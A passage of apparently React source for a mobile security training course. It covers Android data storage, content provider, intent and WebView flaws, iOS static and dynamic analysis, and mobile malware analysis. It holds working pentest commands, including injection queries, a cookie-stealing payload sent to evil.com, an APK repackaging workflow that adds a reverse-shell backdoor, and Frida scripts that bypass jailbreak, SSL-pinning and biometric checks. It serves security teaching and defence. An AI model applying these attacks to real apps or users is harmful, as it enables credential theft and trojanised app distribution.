      'APK repackaging attacks inject malicious code into legitimate apps distributed via third-party stores; signing with a test certificate is the tell',
    ],
    content: (
      <div>
        <P>With the tooling from Chapter 3 available, this chapter covers the specific vulnerability classes you will encounter in Android applications, how to identify them, and how to demonstrate impact.</P>

        <H3>Insecure Data Storage</H3>
        <Pre label="// INSECURE DATA STORAGE - FINDING AND EXPLOITING">{`# SharedPreferences - stored as XML in /data/data/APP/shared_prefs/
# Pre-Android 7: MODE_WORLD_READABLE allowed any app to read them
# Modern Android: still accessible with root or ADB on debuggable app

adb shell su
cat /data/data/com.target.app/shared_prefs/preferences.xml
# Look for: auth_token, user_password, session_id, remember_me

# SQLite databases - stored in /data/data/APP/databases/
adb pull /data/data/com.target.app/databases/ ./databases/
sqlite3 databases/main.db
.tables
SELECT * FROM users;
SELECT * FROM sessions;

# External storage - accessible by any app (pre-Android 10) and via USB
adb shell ls /sdcard/
adb shell ls /sdcard/Android/data/com.target.app/
# Look for: config.json, tokens.txt, exported PDFs with PII

# Internal app files directory
adb shell ls /data/data/com.target.app/files/
# Configuration files, cached credentials, downloaded content`}</Pre>

        <H3>Content Provider SQL Injection</H3>
        <Pre label="// CONTENT PROVIDER ATTACKS">{`# List content providers with Drozer
run app.provider.info -a com.target.app

# Test if content provider is exported and queryable
run app.provider.query content://com.target.app.provider/notes

# SQL injection via projection parameter
run app.provider.query content://com.target.app.provider/notes \
  --projection "* FROM notes--"

# SQL injection via selection parameter
run app.provider.query content://com.target.app.provider/notes \
  --selection "1=1"

# Union-based extraction (if provider uses raw queries)
run app.provider.query content://com.target.app.provider/notes \
  --projection "* FROM users--"

# Path traversal via content URI
run app.provider.query "content://com.target.app.provider/../../etc/passwd"

# Via ADB (no Drozer needed for simple queries)
adb shell content query --uri content://com.target.app.provider/users
adb shell content query --uri content://com.target.app.provider/users \
  --where "1=1"`}</Pre>

        <H3>Activity Hijacking and Intent Injection</H3>
        <Pre label="// ACTIVITY AND INTENT ATTACKS">{`# Exported activity hijacking - launch admin/internal activities
adb shell am start -n com.target.app/.AdminActivity
adb shell am start -n com.target.app/.WebViewActivity \
  -d "file:///data/data/com.target.app/shared_prefs/credentials.xml"

# Intent injection via deep link
# If app handles: myapp://action?url=PARAM
# Test for open redirect / SSRF
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://action?url=https://attacker.com"

# Insecure deserialization via intent extras
# If app deserialises Parcelable extras without validation:
# craft malicious intent with modified extras
adb shell am start -n com.target.app/.InternalActivity \
  --es extra_token "BYPASS" --ez is_admin true

# Sniff outgoing implicit intents (listening for broadcasts)
# Register a receiver matching the same intent-filter as target
# If the intent is implicit, your app gets it`}</Pre>

        <H3>Broadcast Receiver Hijacking</H3>
        <Pre label="// BROADCAST ATTACKS">{`# List exported broadcast receivers
run app.broadcast.info -a com.target.app

# Send broadcast to trigger exported receiver
run app.broadcast.send --action com.target.app.RESET_PASSWORD \
  --extra string email victim@example.com

# Via ADB
adb shell am broadcast -a com.target.app.ADMIN_ACTION \
  --es admin_token bypass123

# Intercept broadcasts (sniffing)
# Create an app with matching intent-filter for the broadcast action
# If not protected with android:permission, your app receives it`}</Pre>

        <H3>WebView Attacks</H3>
        <Pre label="// WEBVIEW VULNERABILITY CLASSES">{`# 1. addJavascriptInterface (API < 17) = Remote Code Execution
# If app uses: webView.addJavascriptInterface(new MyBridge(), "Android")
# And API < 17: attacker JS can call Java reflection to run any code:
# Android.getClass().forName("java.lang.Runtime").getMethod("exec","")...

# 2. File access from URL (pre-Android 4.1 default, or misconfigured)
# If webView.getSettings().setAllowFileAccessFromFileURLs(true):
# Load malicious URL that uses XHR to read file:// URI
# file:///data/data/com.target.app/shared_prefs/auth.xml

# 3. Universal file access
# webView.getSettings().setAllowUniversalAccessFromFileURLs(true)
# Even worse: allows cross-origin file access from file:// URLs

# 4. JavaScript injection via Intent extras
# If app loads URL from intent: myapp://webview?url=PARAM
# Inject: javascript:fetch('https://evil.com?d='+document.cookie)

# Check for these in decompiled code:
grep -r "addJavascriptInterface\|setAllowFileAccess\|setJavaScriptEnabled" ./java_output

# Modern WebView best practice: JavaScript disabled unless needed,
# no file access, no addJavascriptInterface, strict CSP`}</Pre>

        <H3>Deep Link Hijacking</H3>
        <Pre label="// DEEP LINK HIJACKING">{`# 1. Find deep link schemes in AndroidManifest.xml
grep -A5 "intent-filter" AndroidManifest.xml | grep "scheme\|host\|path"

# 2. Register the same scheme in a malicious app
# If legitimate app registers: mybank://transfer
# Attacker registers: mybank://transfer in their own app
# Android shows disambiguation dialog (in some OS versions attacker wins)

# 3. Test deep link handling
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://reset-password?token=TESTTOKEN123"

# 4. Check if deep link data is validated
# Does the app verify the token? Does it check the origin?
# Can you craft a deep link that bypasses authentication?

# 5. Open redirect via deep link
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://open?url=https://phishing.com"`}</Pre>

        <H3>Tapjacking / UI Redirection</H3>
        <Pre label="// TAPJACKING ATTACK">{`# Tapjacking: a malicious app draws an overlay on top of a target app's UI
# User thinks they're clicking "Allow" on a system dialog
# But they're actually clicking something else underneath

# Check if app is vulnerable:
# - Does it lack FLAG_SECURE on sensitive screens?
# - Does it have filterTouchesWhenObscured="true" on sensitive buttons?

# Test: use an overlay app during the target's sensitive operations
# Android 12+ has improved protections, but older OS versions are vulnerable

# Defence: setFilterTouchesWhenObscured(true) on critical UI elements
# Or: getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, ...)`}</Pre>

        <H3>APK Repackaging Attack</H3>
        <Pre label="// APK REPACKAGING WORKFLOW">{`# 1. Decompile legitimate APK
apktool d LegitApp.apk -o legit_output

# 2. Inject malicious payload (e.g. reverse shell smali code)
# Add malicious smali class to legit_output/smali/com/evil/Backdoor.smali
# Modify AndroidManifest.xml to add malicious service/receiver
# Add permissions (INTERNET, READ_CONTACTS, etc.)

# 3. Rebuild APK
apktool b legit_output -o repackaged.apk

# 4. Sign with test certificate
keytool -genkey -v -keystore evil.keystore -alias evil \
  -keyalg RSA -keysize 2048 -validity 10000
jarsigner -keystore evil.keystore repackaged.apk evil
zipalign -v 4 repackaged.apk final.apk

# 5. Distribute via third-party stores, phishing links, etc.
# Detection: certificate mismatch vs original Play Store version
# Original: signed by developer key
# Repackaged: signed by different (attacker) key

# Verify APK signature
apksigner verify --print-certs TARGET.apk`}</Pre>

        <Note type="warn">Insecure data storage and content provider vulnerabilities are the most commonly found and easily demonstrable findings in real Android app assessments. Always check these first - they provide clear, low-effort high-impact evidence for your report.</Note>
      </div>
    ),
  },

  // ─── CHAPTER 5 ───────────────────────────────────────────────────────────────
  {
    id: 'mob-05',
    title: 'iOS Static Analysis',
    difficulty: 'INTERMEDIATE',
    readTime: '14 min',
    labLink: '/modules/mobile-security/lab',
    takeaways: [
      'IPA files are ZIP archives - extract with unzip to access the binary, Info.plist, frameworks, and resources',
      'Info.plist analysis reveals URL schemes, entitlements, ATS configuration, and privacy usage descriptions - all critical for understanding the attack surface',
      'otool is the built-in macOS tool for binary analysis; nm lists symbols; Hopper and Ghidra provide full decompilation to pseudo-C',
      'ATS (App Transport Security) misconfigurations allowing arbitrary loads or cleartext for specific domains are reportable findings',
      'Hardcoded credentials in iOS apps are typically found in: binary strings, embedded plist files, compiled .strings files, and bundled config JSON files',
    ],
    content: (
      <div>
        <P>iOS static analysis is more constrained than Android because IPAs from the App Store are encrypted at the binary level (FairPlay DRM). To get a decrypted binary for analysis, you typically need either a jailbroken device to dump the decrypted binary from memory, or access to the IPA via developer distribution/TestFlight. From there, the analysis workflow is similar to Android.</P>

        <H3>IPA Structure</H3>
        <Pre label="// IPA INTERNAL STRUCTURE">{`# IPA is a ZIP archive
cp TARGET.ipa TARGET.zip
unzip TARGET.zip -d ipa_contents

# Internal structure:
ipa_contents/
|-- Payload/
|   |-- TARGET.app/
|       |-- TARGET                    # Main binary (ARM64 Mach-O)
|       |-- Info.plist                 # App metadata, permissions, URL schemes
|       |-- embedded.mobileprovision   # Provisioning profile (if present)
|       |-- _CodeSignature/
|       |   |-- CodeResources          # Signed files manifest
|       |-- Frameworks/
|       |   |-- SomeSDK.framework/     # Bundled frameworks (third-party libs)
|       |-- PlugIns/                   # App extensions
|       |-- .lproj/                    # Localisation strings
|       |-- Resources/                 # Images, sounds, config files
|       |-- Assets.car                 # Compiled asset catalog`}</Pre>

        <H3>Info.plist Analysis</H3>
        <Pre label="// INFO.PLIST KEY FIELDS FOR SECURITY ANALYSIS">{`# Decode binary plist to XML (if binary encoded)
plutil -convert xml1 Info.plist -o Info_decoded.plist
# or on macOS:
plistutil -i Info.plist -o Info.xml

# Key fields to check:

# 1. URL Schemes (deep link entry points)
CFBundleURLTypes -> CFBundleURLSchemes: ["myapp", "fb123456"]

# 2. App Transport Security (ATS) - cleartext/weak TLS config
NSAppTransportSecurity:
  NSAllowsArbitraryLoads: true       # CRITICAL: allows all HTTP
  NSExceptionDomains:
    legacy-api.example.com:
      NSExceptionAllowsInsecureHTTPLoads: true

# 3. Privacy usage descriptions (what data it accesses)
NSCameraUsageDescription: "Required for profile picture"
NSLocationWhenInUseUsageDescription: "Used for delivery"
NSContactsUsageDescription: "To find your friends"
# Presence does NOT mean access is legitimate - verify in code

# 4. Background modes (persistent access)
UIBackgroundModes: ["location", "audio", "fetch", "remote-notification"]

# 5. Entitlements (capabilities)
com.apple.developer.icloud-container-identifiers
com.apple.security.application-groups
com.apple.developer.nfc.readersession.formats`}</Pre>

        <H3>Binary Analysis with otool and nm</H3>
        <Pre label="// OTOOL AND NM COMMANDS">{`# List linked dynamic libraries
otool -L Payload/TARGET.app/TARGET

# Display Mach-O header info
otool -hv Payload/TARGET.app/TARGET

# Disassemble text (code) section
otool -tV Payload/TARGET.app/TARGET | head -100

# List Objective-C classes (unobfuscated build)
otool -ov Payload/TARGET.app/TARGET | grep "class name"

# nm: list symbol table
nm Payload/TARGET.app/TARGET | head -50
nm Payload/TARGET.app/TARGET | grep " T "  # Exported text symbols
nm Payload/TARGET.app/TARGET | grep " U "  # Undefined (imported) symbols

# Strings extraction
strings Payload/TARGET.app/TARGET | grep -i "api\|key\|secret\|token\|pass"
strings Payload/TARGET.app/TARGET | grep "https://"
strings Payload/TARGET.app/TARGET | grep -E "AKIA[A-Z0-9]{16}"  # AWS keys

# Check if binary is stripped (stripped = no symbols, harder to reverse)
# Unstripped: nm shows many T symbols with readable names
# Stripped: only U symbols remain`}</Pre>

        <H3>class-dump for Objective-C Headers</H3>
        <Pre label="// CLASS-DUMP USAGE">{`# Install class-dump
brew install class-dump
# or download: https://github.com/nygard/class-dump

# Extract all Objective-C class headers
class-dump -H Payload/TARGET.app/TARGET -o ./headers/

# This outputs .h files for every class: properties, methods, ivars
# Perfect for understanding app structure without source code

# Example output (headers/LoginViewController.h):
# @interface LoginViewController : UIViewController
# @property(nonatomic, copy) NSString *username;
# @property(nonatomic, copy) NSString *password;
# - (void)loginButtonTapped:(id)sender;
# - (BOOL)validateCredentials:(NSString *)user password:(NSString *)pass;
# @end

# Swift apps: class-dump doesn't work for Swift
# Use: swiftdemangler for symbol demangling
# nm binary | grep "_T" | swift-demangle`}</Pre>

        <H3>Hopper Disassembler</H3>
        <P>Hopper is the go-to commercial disassembler for iOS binary analysis on macOS. It opens Mach-O binaries, identifies functions, and its decompiler generates readable pseudo-C code from ARM64 assembly. The workflow: File - Read Executable, wait for analysis, navigate by function name, use the decompiler window (F5) for each function of interest.</P>
        <Pre label="// HOPPER KEY WORKFLOW">{`# Load binary: File -> Read Executable -> select TARGET binary
# Analysis: Auto, select ARM64 architecture
# Wait for: initial analysis + string/xref analysis (can take minutes)

# Navigation:
# - Labels (left panel): all functions, string references
# - Search (Ctrl+F): find function names, strings
# - ASM view: raw ARM64 disassembly
# - Decompiler view (Alt+Enter or View -> Decompiler): pseudo-C code
# - String xrefs: click on string -> Show References to find where it's used

# Common finds in Hopper:
# - Hardcoded credentials in methods that build auth headers
# - SSL pinning methods (look for SecTrustEvaluate, URLSession delegate methods)
# - Crypto key material embedded as NSData or hex literals
# - Obfuscated string decryption routines`}</Pre>

        <H3>Ghidra for iOS ARM64</H3>
        <Pre label="// GHIDRA iOS ANALYSIS SETUP">{`# Ghidra (free, NSA, works on any OS)
# Download: https://ghidra-sre.org

# Import Mach-O binary:
# 1. File -> Import File -> select TARGET binary
# 2. Processor: AARCH64 (for modern iPhones)
# 3. Analyze: Yes (use default options)
# 4. Function decompiler: Window -> Decompiler (auto-shows for selected function)

# Key Ghidra features for iOS analysis:
# - Symbol table import (if you have debug symbols)
# - String listing: Window -> Defined Strings
# - Function graph: shows control flow visually
# - Data type manager: import iOS headers for better decompilation
# - Scripting: Python/Java API for automated analysis`}</Pre>

        <H3>MobSF iOS Static Analysis</H3>
        <Pre label="// MOBSF WITH IPA FILES">{`# Upload IPA to MobSF (same interface as APK)
# MobSF iOS analysis covers:
# - Info.plist analysis (ATS config, URL schemes, permissions)
# - Binary analysis (shared libs, crypto APIs used, security flags)
# - Static code analysis (if app is not encrypted/obfuscated)
# - Hardcoded secrets detection
# - Third-party framework vulnerability check

# Binary protection checks MobSF performs:
# - PIE (Position Independent Executable): should be enabled
# - Stack Smashing Protection (-fstack-protector): should be enabled
# - ARC (Automatic Reference Counting): should be enabled
# - Bitcode: indicates re-compilation capability

# Check binary protections manually:
otool -hv TARGET | grep flags       # PIE flag
otool -Iv TARGET | grep stack_chk   # Stack canary
otool -Iv TARGET | grep objc_release # ARC present`}</Pre>

        <Note type="tip">For ATS analysis, NSAllowsArbitraryLoads: true is the highest severity finding (equivalent to disabling HTTPS). NSExceptionDomains with specific domains is medium severity. Apple enforces ATS during App Store review but many apps have exception domains that expose sensitive data over HTTP in production.</Note>
      </div>
    ),
  },

  // ─── CHAPTER 6 ───────────────────────────────────────────────────────────────
  {
    id: 'mob-06',
    title: 'iOS Dynamic Analysis & Runtime Manipulation',
    difficulty: 'ADVANCED',
    readTime: '16 min',
    labLink: '/modules/mobile-security/lab',
    takeaways: [
      'Jailbreaking grants root access and allows frida-server, Cydia, file system access, and kernel-level inspection - required for the deepest iOS analysis',
      'Checkra1n exploits the Checkm8 bootrom vulnerability (unpatchable in hardware) for devices A5-A11; Palera1n covers A8-A16 on iOS 15-16',
      'Objection for iOS provides keychain dump, SSL pinning disable, jailbreak detection bypass, and pasteboard monitoring in one tool',
      'The iOS keychain contains the most sensitive app data - always dump it with objection or keychain-dumper on jailbroken devices',
      'Frida Gadget injection allows dynamic analysis on non-jailbroken iOS devices by repackaging the IPA with the Gadget framework injected',
    ],
    content: (
      <div>
        <P>Dynamic analysis on iOS requires either a jailbroken device or Frida Gadget injection. The jailbreak requirement is a higher barrier than Android, but the payoff is deep access to the runtime, keychain, encrypted databases, and all app data.</P>

        <H3>Jailbreaking Overview</H3>
        <Table
          headers={['Tool', 'Supported Devices', 'iOS Version', 'Type', 'Notes']}
          rows={[
            ['Checkra1n', 'A5-A11 (iPhone 5s - X)', 'iOS 12-14', 'Tethered/Semi-tethered', 'Checkm8 bootrom exploit, unpatchable in hardware'],
            ['Palera1n', 'A8-A16', 'iOS 15-16', 'Semi-tethered/Rootless', 'checkra1n successor, rootless mode on A12+'],
            ['Dopamine', 'A12-A15', 'iOS 15-16', 'Rootless', 'Package manager: Sileo, uses Fugu15 kernel exploit'],
            ['unc0ver', 'A12-A14', 'iOS 14', 'Semi-untethered', 'Legacy, largely replaced by Palera1n'],
          ]}
        />
        <Pre label="// JAILBREAK DETECTION BYPASS">{`# Common jailbreak detection checks in apps:
# - File existence: /Applications/Cydia.app, /bin/bash, /etc/apt, /private/var/lib/cydia
# - Sandbox write test: try writing to /private/test.txt (only works outside sandbox)
# - Forking processes: call fork() - should fail in App Store sandboxed apps
# - Dynamic library check: check loaded dylibs for Substrate, Frida
# - Cydia URL scheme: check if cydia:// opens

# Bypass with Objection:
objection -g com.target.app explore
ios jailbreak disable

# Bypass with Liberty Lite (Cydia tweak):
# Install Liberty Lite from Packix repo
# Add the target app to bypass list

# Bypass with Shadow (Cydia tweak):
# More aggressive, mimics stock iOS environment

# Manual bypass with Frida: hook the isJailbroken() method
Java.perform(function() {
  // iOS: use ObjC.classes not Java.use
  var JailbreakCheck = ObjC.classes.JailbreakChecker;
  var method = JailbreakCheck['- isJailbroken'];
  Interceptor.attach(method.implementation, {
    onLeave: function(retval) { retval.replace(0); }
  });
});`}</Pre>

        <H3>Frida on iOS</H3>
        <Pre label="// FRIDA SETUP ON iOS">{`# Method 1: Jailbroken device via Cydia/Sileo
# In Sileo/Cydia: add Frida repo: https://build.frida.re
# Install: Frida package

# Verify frida-server is running
# (starts automatically after jailbreak install on most setups)
frida-ps -U   # Should list iOS processes

# Method 2: Gadget injection (non-jailbroken)
# Download Frida iOS Gadget .dylib for arm64
# https://github.com/frida/frida/releases
# FridaGadget.dylib

# Inject into IPA:
# 1. Extract IPA, navigate to Payload/APP.app/Frameworks/
# 2. Copy FridaGadget.dylib there
# 3. Add load command to binary (use insert_dylib tool)
# 4. Re-sign with developer cert
# 5. Install via Xcode or ios-deploy

# Then connect:
frida -U Gadget -l your_script.js

# Key Frida iOS APIs
ObjC.classes                    # Access all Objective-C classes
ObjC.classes.NSString.stringWithUTF8String_('hello')
new ObjC.Object(ptr)           # Wrap pointer as ObjC object`}</Pre>

        <Pre label="// FRIDA iOS SCRIPT EXAMPLES">{`// Hook Objective-C method
var ViewController = ObjC.classes.LoginViewController;
var method = ViewController['- validatePassword:'];
Interceptor.attach(method.implementation, {
  onEnter: function(args) {
    // args[0] = self, args[1] = selector, args[2] = first param
    var password = new ObjC.Object(args[2]);
    console.log('[+] validatePassword: ' + password.toString());
  },
  onLeave: function(retval) {
    console.log('[+] Return: ' + retval);
    retval.replace(1);  // Force true (authenticated)
  }
});

// Hook Swift method (demangled name required)
// Find demangled name with: nm binary | swift-demangle
Interceptor.attach(Module.findExportByName(null, '_TFC11TargetApp15LoginViewControllerP10checkAuthfS0_FT8passwordSS_Sb'), {
  onLeave: function(retval) { retval.replace(1); }
});`}</Pre>

        <H3>Objection iOS Commands</H3>
        <Pre label="// OBJECTION iOS COMPLETE REFERENCE">{`# Connect
objection -g com.target.app explore

# Binary and bundle info
ios info binary
ios bundles list_bundles
ios bundles list_frameworks

# Keychain - CRITICAL: dumps all keychain items
ios keychain dump
ios keychain dump --json keychain.json
ios keychain dump_raw

# Pasteboard monitoring
ios pasteboard monitor          # Watch clipboard in real time

# SSL pinning bypass
ios sslpinning disable

# Jailbreak detection bypass
ios jailbreak disable

# Biometric bypass (Face ID / Touch ID)
ios ui biometric_bypass         # Force biometric auth to succeed

# UI automation
ios ui screenshot ./screenshot.png
ios ui dump                     # Dump UI hierarchy

# Filesystem
ios filesystem ls /
ios filesystem ls /var/mobile/Containers/Data/Application/
ios filesystem download /var/mobile/... ./local_copy

# Hooking
ios hooking list classes
ios hooking list class_methods NSURLSession
ios hooking watch method "-[NSURLSession dataTaskWithRequest:completionHandler:]" --dump-args --dump-return`}</Pre>

        <H3>SSL Pinning Bypass on iOS</H3>
        <Pre label="// iOS SSL PINNING BYPASS">{`# Method 1: Objection (easiest)
ios sslpinning disable

# Method 2: SSL Kill Switch 2 (Cydia tweak, jailbreak only)
# Add repo: https://julioverne.github.io
# Install: SSL Kill Switch 2
# Toggle in Settings -> SSL Kill Switch 2 -> Disable Certificate Validation

# Method 3: Frida script - hook SecTrustEvaluate
Interceptor.attach(Module.findExportByName('Security', 'SecTrustEvaluate'), {
  onLeave: function(retval) {
    retval.replace(0);  // errSecSuccess = 0
  }
});

// Also hook SecTrustEvaluateWithError (newer API)
Interceptor.attach(Module.findExportByName('Security', 'SecTrustEvaluateWithError'), {
  onLeave: function(retval) {
    retval.replace(1);  // Return true (trusted)
  }
});

# Method 4: Patch ATSV (App Transport Security) in Info.plist
# Only works for apps using NSURLSession with default ATS
# Edit Info.plist: NSAllowsArbitraryLoads = true
# Re-sign and install`}</Pre>

        <H3>Keychain Extraction</H3>
        <Pre label="// iOS KEYCHAIN FORENSICS">{`# Objection (easiest, works on jailbroken + Gadget)
ios keychain dump

# keychain-dumper (jailbroken device binary)
# Download from: https://github.com/ptoomey3/Keychain-Dumper
adb push keychain-dumper /var/root/   # via AFC or SSH
ssh root@DEVICE_IP
chmod 755 /var/root/keychain-dumper
/var/root/keychain-dumper

# What the keychain contains:
# - WiFi passwords
# - App passwords and auth tokens
# - Private keys and certificates
# - Passphrase-protected notes
# - Browser saved passwords (Safari)
# - Third-party app secrets

# iOS keychain access groups:
# Apps can share keychain data via access groups
# Shared keychain is accessible by all apps in the same group
# Check entitlements for: com.apple.security.application-groups`}</Pre>

        <H3>Biometric Authentication Bypass</H3>
        <Pre label="// FACE ID / TOUCH ID BYPASS">{`# iOS biometric auth uses LocalAuthentication framework
# The canEvaluatePolicy and evaluatePolicy callbacks can be hooked

# Objection biometric bypass
ios ui biometric_bypass

# Frida script to bypass LAContext.evaluatePolicy
var LAContext = ObjC.classes.LAContext;
var evalPolicy = LAContext['- evaluatePolicy:localizedReason:reply:'];
Interceptor.attach(evalPolicy.implementation, {
  onEnter: function(args) {
    // args[3] = reply block (the callback)
    var block = new ObjC.Block(args[3]);
    var origImpl = block.implementation;
    block.implementation = function(success, error) {
      // Force success = true, error = nil
      origImpl(1, null);
    };
  }
});`}</Pre>

        <H3>Traffic Analysis with Proxyman and Burp</H3>
        <Pre label="// iOS TRAFFIC INTERCEPTION">{`# Proxyman (macOS, easiest for iOS)
# https://proxyman.io
# Install Proxyman, go to Certificate -> Install Certificate on iOS Device
# Follow wizard - installs cert and configures proxy automatically

# Burp Suite (manual setup):
# 1. Configure Burp proxy on 0.0.0.0:8080
# 2. On iOS: Settings -> WiFi -> BURP_NETWORK -> Configure Proxy -> Manual
#    Server: BURP_IP, Port: 8080
# 3. Visit http://burpsuite in Safari -> Download CA cert
# 4. Install: Settings -> General -> VPN & Device Management -> install cert
# 5. Trust: Settings -> General -> About -> Certificate Trust Settings -> toggle on

# HTTP Toolkit (alternative, easier TLS interception)
# https://httptoolkit.tech/docs/guides/ios/`}</Pre>

        <Note type="info">iGoat is an intentionally vulnerable iOS app for practice: https://github.com/OWASP/iGoat-Swift. Install on a jailbroken device to practice keychain attacks, URL scheme hijacking, binary patching, and SSL pinning bypass in a legal, controlled environment.</Note>
      </div>
    ),
  },

  // ─── CHAPTER 7 ───────────────────────────────────────────────────────────────
  {
    id: 'mob-07',
    title: 'Mobile Malware & Spyware Analysis',
    difficulty: 'ADVANCED',
    readTime: '16 min',
    labLink: '/modules/mobile-security/lab',
    takeaways: [
      'Pegasus is a zero-click commercial spyware that exploits memory corruption in iMessage, Safari, and other attack surfaces - requires nation-state level capability to deploy',
      'MVT (Mobile Verification Toolkit) by Amnesty International is the authoritative tool for spyware forensics on both iOS and Android devices',
      'Android banking trojans use Accessibility Service abuse to read screen content and overlay attacks to steal credentials from legitimate banking apps',
      'Dynamic DEX loading and reflection are the two primary obfuscation techniques in Android malware - dump the decrypted DEX from memory with Frida at runtime',
      'For quick triage, VirusTotal APK upload and Koodous provide automated malware detection before committing to deep analysis',
    ],
    content: (
      <div>
        <P>Mobile malware analysis combines the skills from static and dynamic analysis chapters with threat intelligence and forensics. This chapter covers the major mobile malware families, commercial spyware, and the tools and workflows for analysing suspected malicious apps.</P>

        <H3>Android Malware Families</H3>
        <Table
          headers={['Family', 'Type', 'Key Capabilities', 'Notable Feature']}
          rows={[
            ['Cerberus', 'Banking Trojan', 'Overlay, RAT, 2FA theft, keylogger', 'Source code leaked 2020, spawned many variants'],
            ['Anubis', 'Banking Trojan', 'Overlay, SMS intercept, screen record', 'Targeted 300+ banking apps globally'],
            ['SOVA', 'Banking Trojan', 'Overlay, cookie theft, ransomware module', 'Intercepts 2FA, targets crypto wallets'],
            ['SharkBot', 'Banking Trojan', 'ATS (Accessibility Transfer Service)', 'Auto-transfers via Accessibility without overlay'],
            ['SpyNote', 'RAT', 'Full remote access, live screen, mic/camera', 'Sold as crimeware, widely deployed'],
            ['AndroRAT', 'RAT', 'Contacts, SMS, GPS, mic, camera', 'Open source, widely modified'],
            ['Simplocker', 'Ransomware', 'File encryption, ransom note', 'First mobile ransomware targeting SD card files'],
          ]}
        />

        <H3>Pegasus Spyware</H3>
        <P>Pegasus (developed by NSO Group) is the most technically sophisticated mobile malware ever documented. It achieves zero-click remote code execution on fully patched iPhones through memory corruption vulnerabilities in iMessage attachment parsing, WebKit (Safari), and other attack surfaces. Once exploited, it installs a persistent implant that exfiltrates messages, emails, calls, location, activates mic and camera, and can read end-to-end encrypted messages (Signal, WhatsApp) by reading directly from screen memory.</P>
        <Pre label="// PEGASUS INDICATORS OF COMPROMISE">{`# Pegasus IOCs documented by Citizen Lab and Amnesty International

# Suspicious process names (vary by version):
binaryd          # Data exfiltration binary
CommsCenterRootHelper
fmfd             # "Find My" abuse for persistence
misagent         # Abuses misagent for cert operations

# Abnormal network connections:
# CDN-fronted C2 servers (often on Fastly, Cloudflare)
# Connections to domains matching Pegasus infrastructure patterns
# Short-lived DNS queries to rotating domains

# Crash log anomalies:
# Crash logs from processes that shouldn't crash
# com.apple.iMessage.crashreporter entries at time of exploit

# SQLite database anomalies:
# Deleted entries in DataUsage.sqlite (Pegasus cleans up)
# Process names with short data usage windows

# Use MVT for full detection - these manual checks are insufficient`}</Pre>

        <H3>MVT - Mobile Verification Toolkit</H3>
        <Pre label="// MVT INSTALLATION AND USAGE">{`# Install MVT
pip install mvt

# ---- iOS Analysis ----

# Option 1: From iTunes/Finder backup (no jailbreak needed)
mvt-ios check-backup --iocs ~/iocs/pegasus.stix2 /path/to/backup/

# Create unencrypted backup first:
# iTunes: select device -> Summary -> Back Up Now -> uncheck encrypt

# Option 2: From filesystem dump (jailbroken device required)
# Use idevicebackup2 or Cellebrite for full filesystem
mvt-ios check-fs --iocs ~/iocs/pegasus.stix2 /path/to/fs/dump/

# Download Pegasus IOC file:
# https://github.com/AmnestyTech/investigations/tree/master/2021-07-18_nso

# MVT iOS output directories:
# timeline/          - Full activity timeline
# detected/          - Positive IOC matches
# applications/      - Installed app list
# processes/         - Process list snapshots
# sms/               - SMS database analysis
# calls/             - Call log analysis

# ---- Android Analysis ----
# Option 1: ADB backup
mvt-android check-adb --iocs ~/iocs/predator.stix2

# Option 2: Android backup .ab file
mvt-android check-backup --iocs ~/iocs/ /path/to/backup.ab

# MVT looks for:
# - Known spyware domain matches in browser history
# - Known spyware package names in app lists
# - Anomalous SMS messages with exploit-linked URLs
# - Process names associated with implants`}</Pre>

        <H3>Android Malware Static Analysis</H3>
        <Pre label="// MALWARE STATIC ANALYSIS WORKFLOW">{`# Step 1: Initial triage - VirusTotal
# Upload to https://www.virustotal.com
# Check: detection ratio, behavioral analysis, YARA rule matches

# Step 2: Koodous (Android-specific malware analysis)
# https://koodous.com
# Upload APK, check community analysis and YARA rules

# Step 3: MobSF automated analysis
docker run -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Upload malware APK, review full analysis

# Step 4: Permissions analysis (overprivilege = malware indicator)
# Red flags:
# - BIND_ACCESSIBILITY_SERVICE (banking trojan overlay mechanism)
# - RECEIVE_BOOT_COMPLETED + persistent service (stalkerware)
# - READ_SMS + INTERNET (SMS forwarding)
# - RECORD_AUDIO + INTERNET (mic recording)
# - WRITE_SMS (premium SMS fraud)

# Step 5: Look for dynamic DEX loading
grep -r "DexClassLoader\|PathClassLoader\|loadClass" ./java_output
# Malware loads second-stage DEX from assets/ or downloads it

# Step 6: Look for reflection (evading static analysis)
grep -r "Class.forName\|getDeclaredMethod\|invoke" ./java_output

# Step 7: C2 identification
grep -r "http://\|https://" ./java_output | grep -v "@"
# Look for hardcoded IPs, domain generation patterns`}</Pre>

        <H3>DEX Packing and Unpacking</H3>
        <Pre label="// UNPACKING PACKED ANDROID MALWARE">{`# Packed malware: the real payload DEX is encrypted in assets/
# A small loader DEX decrypts and loads the payload at runtime

# Method: Frida memory dump at runtime
# Wait until app has loaded (past loader stage), then dump all DEX from memory
frida -U -f com.malware.sample --no-pause -l dump_dex.js

# dump_dex.js example (conceptual):
// Enumerate modules and look for DEX in memory
Process.enumerateModules({
  onMatch: function(mod) {
    if (mod.name.indexOf('.dex') >= 0 || mod.path.indexOf('dex') >= 0) {
      console.log('[+] DEX: ' + mod.name + ' base: ' + mod.base + ' size: ' + mod.size);
      // Memory.readByteArray(mod.base, mod.size) -> save to file
    }
  },
  onComplete: function() {}
});

# After memory dump: run jadx on the dumped DEX file
jadx -d ./unpacked_output ./dumped_payload.dex

# Hybrid Analysis sandbox (automated online)
# https://www.hybrid-analysis.com
# Submit APK -> get dynamic analysis report, network traffic, file activity`}</Pre>

        <H3>Banking Trojan Overlay Attack Analysis</H3>
        <Pre label="// BANKING TROJAN ANALYSIS">{`# Overlay attack mechanism:
# 1. Trojan waits for foreground app to match target (e.g. banking app)
# 2. Shows a pixel-perfect fake overlay on top of the real app
# 3. User enters credentials into the fake overlay
# 4. Credentials sent to C2, real app continues normally

# Detection in malware code:
# - Accessibility Service to detect foreground app
# - TYPE_APPLICATION_OVERLAY window type for overlay
# - Persistent service that monitors foreground app changes

# ATS (Accessibility Transfer Service) variant - SharkBot technique:
# - Abuses Accessibility to READ the screen (no overlay needed)
# - Automatically fills and confirms transfer forms
# - Only needs one-time Accessibility permission grant

# Finding overlay resources in APK:
unzip TARGET.apk
# Look in res/layout/ for layouts named after bank apps
# Look in assets/ for HTML/CSS phishing pages
ls assets/ | grep -i "bank\|chase\|hsbc\|wellsfargo"`}</Pre>

